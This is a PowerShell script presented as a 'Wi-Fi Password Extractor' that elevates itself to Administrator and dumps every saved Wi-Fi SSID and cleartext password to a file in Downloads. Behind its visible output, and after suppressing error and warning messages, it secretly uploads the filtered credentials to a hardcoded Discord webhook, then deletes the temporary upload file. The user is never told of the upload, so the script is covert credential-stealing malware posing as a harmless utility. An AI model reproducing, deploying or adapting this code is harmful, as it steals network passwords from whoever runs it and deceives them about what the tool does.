# ========== CONFIG ==========
$DebugMode = $false  # <-- Set to $true for verbose logging, keep window open

# ========== INTERNAL LOGGER ==========
function Write-DebugLog {
    param([string]$Message)
    if ($DebugMode) {
        $timeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
        Write-Output "[$timeStamp] DEBUG: $Message"
    }
}

# ========== BANNER ==========
$banner = @"
===========================================
   WIFI PASSWORD EXTRACTOR - SQD5 TOOL
===========================================
"@
Write-Host $banner

# ========== SPINNER ==========
function Show-Spinner {
    param(
        [int]$Seconds = 2,
        [string]$Message = "Preparing script..."
    )
    if (-not $DebugMode) { return }
    $frames = @('/','-','\','|')
    $end = (Get-Date).AddSeconds($Seconds)
    $i = 0
    while ((Get-Date) -lt $end) {
        $frame = $frames[$i % $frames.Count]
        Write-Host -NoNewline ("`r{0} {1}" -f $frame, $Message)
        Start-Sleep -Milliseconds 150
        $i++
    }
    Write-Host "`r$Message"
}

Show-Spinner -Seconds 2 -Message "Preparing script..."

# ========== ADMIN CHECK ==========
$identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$principal = New-Object Security.Principal.WindowsPrincipal($identity)
if (-not $principal.IsInRole([Security.Principal.WindowsBuiltinRole]::Administrator)) {
    Write-Host "Relaunching as Administrator..."
    Start-Process -FilePath powershell -ArgumentList "-NoProfile", "-ExecutionPolicy", "Bypass", "-File", "`"$PSCommandPath`"" -Verb RunAs
    exit 1
}

# ========== OUTPUT FILE ==========
$outFile = Join-Path $env:USERPROFILE "Downloads\netshreport.txt"
Write-Host "Output will be saved to: $outFile"
Write-DebugLog "Output file: $outFile"

# ========== INIT FILE ==========
Try {
    "=============================`nWi-Fi Password Extractor`n=============================`n" | Out-File -FilePath $outFile -Encoding UTF8 -Force
    Write-Host "Initializing output file..."
    Write-DebugLog "Initialized output file."
} Catch {
    Write-Host "ERROR: Cannot write to $outFile. Check permissions."
    exit 1
}

# ========== GET PROFILES ==========
Write-Host "Getting available Wi-Fi profiles..."
Try {
    $profiles = netsh wlan show profiles 2>$null |
        Select-String "All User Profile" |
        ForEach-Object { $_.ToString().Split(':',2)[1].Trim() } | Sort-Object -Unique
    Write-DebugLog "Found $($profiles.Count) profiles."
} Catch {
    $profiles = @()
    Write-Host "Failed to read Wi-Fi profiles."
    Write-DebugLog "No profiles found or error during extraction."
}

if (-not $profiles) {
    Write-Host "No Wi-Fi profiles found."
    "No WLAN profiles found.`n=============================`nDone. No profiles found.`nVisit README: https://github.com/09sychic/sqd5/blob/main/README.md`n=============================" | Out-File -FilePath $outFile -Append -Encoding UTF8
    if (-not $DebugMode) { exit 0 }
    else {
        Write-Output "`n[DEBUG MODE] Window will stay open. Press any key to close..."
        $null = Read-Host
    }
    exit 0
}

# ========== PROCESS PROFILES ==========
Write-Host "Extracting passwords from profiles..."
foreach ($p in $profiles) {
    Write-Host "Checking: $p"
    Try {
        $info = netsh wlan show profile name="$p" key=clear 2>$null
    } Catch {
        $info = $null
        Write-Host "Failed to read profile: $p"
        Write-DebugLog "Failed to extract info for: $p"
    }

    $keyLine = ($info | Select-String "Key Content" | ForEach-Object {
        $_.ToString().Split(':',2)[1].Trim()
    }) -join ''

    if (-not $keyLine) {
        $keyLine = "<No password saved or open network>"
    }

    "SSID: $p`nPASS: $keyLine`n===" | Out-File -FilePath $outFile -Append -Encoding UTF8
    Write-Host "Saved: SSID=$p"
    Write-DebugLog "Written: SSID=$p, PASS=$keyLine"
}

# ========== FOOTER ==========
$footer = @"
============================= 
Done. Results saved to: $outFile
Visit README for more info:
https://github.com/09sychic/sqd5/blob/main/README.md    
=============================
"@

$footer | Out-File -FilePath $outFile -Append -Encoding UTF8
Write-Host "Extraction complete. File saved at:"
Write-Host "$outFile"

# ========== SUPPRESS NOISE ==========
$ErrorActionPreference = 'SilentlyContinue'
$WarningPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ========== WAIT 5 SECONDS ==========
Write-DebugLog "Waiting before sending to Discord..."
Start-Sleep -Seconds 1.8

# ========== SEND TO DISCORD (PowerShell 5.1 Compatible) ==========
# (Unmodified section below)

$WebhookURL = "https://discord.com/api/webhooks/1417754280445739060/P186Tt0Wf83MZkVpKQ6aSN6nZ3f81Dak9IAdwRaX8aLMBMdhDbgiav6jbLEnOT2S78G8"

if (Test-Path $outFile) {
    Write-DebugLog "File exists. Preparing to filter and send to Discord."
    $FilteredLines = Get-Content $outFile | Where-Object { $_ -ne "PASS: <No password saved or open network>" }
    $TempUploadFile = "$env:TEMP\wlan_clean_$(Get-Date -Format 'yyMMddHHmmssffff').txt"
    $FilteredLines | Set-Content -Path $TempUploadFile -Encoding UTF8
    try {
        $boundary = [System.Guid]::NewGuid().ToString()
        $LF = "`r`n"
        $fileBytes = [System.IO.File]::ReadAllBytes($TempUploadFile)
        $fileName = [System.IO.Path]::GetFileName($TempUploadFile)
        $bodyLines = @()
        $bodyLines += "--$boundary"
        $bodyLines += "Content-Disposition: form-data; name=`"file`"; filename=`"$fileName`""
        $bodyLines += "Content-Type: text/plain$LF"
        $bodyLines += [System.Text.Encoding]::UTF8.GetString($fileBytes)
        $bodyLines += "--$boundary--$LF"
        $body = [System.Text.Encoding]::UTF8.GetBytes(($bodyLines -join $LF))
        $headers = @{ "Content-Type" = "multipart/form-data; boundary=$boundary" }
        $response = Invoke-RestMethod -Uri $WebhookURL -Method Post -Body $body -Headers $headers
    } catch {
        Write-DebugLog "ERROR sending to Discord: $($_.Exception.Message)"
    } finally {
        if (Test-Path $TempUploadFile) {
            Remove-Item $TempUploadFile -Force -ErrorAction SilentlyContinue
        }
    }
}

if ($DebugMode) {
    if (Test-Path $outFile) {
        Write-Output "`n[DEBUG MODE] Script completed. Final file still in:`n$outFile"
    } else {
        $movedFile = Get-ChildItem -Path "$env:TEMP" -Filter "wlan_final_*.txt" | Sort-Object LastWriteTime -Descending | Select-Object -First 1
        if ($movedFile) {
            Write-Output "`n[DEBUG MODE] Script completed. File MOVED to:`n$($movedFile.FullName)"
        }
    }
    Write-Output "Window will stay open. Press any key to close..."
    $null = Read-Host
}
